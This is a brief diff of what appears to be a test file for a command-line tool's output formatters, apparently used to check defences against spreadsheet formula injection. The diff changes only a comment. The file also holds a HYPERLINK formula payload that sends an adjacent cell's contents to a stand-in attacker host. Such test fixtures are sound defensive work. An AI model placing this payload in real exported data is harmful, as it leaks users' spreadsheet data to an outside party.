@@ -25,7 +25,7 @@ from cli_modelarium.output_formatters import (
     _format_markdown,
 )
 
-# The payload an audit demonstrated end to end. `&A2` concatenates the adjacent
+# A payload that reaches a spreadsheet as a live formula. `&A2` concatenates the adjacent
 # cell into the URL, which is what makes this exfiltration rather than defacement.
 HYPERLINK_PAYLOAD = '=HYPERLINK("http://evil.example/?d="&A2,"Click")'
 
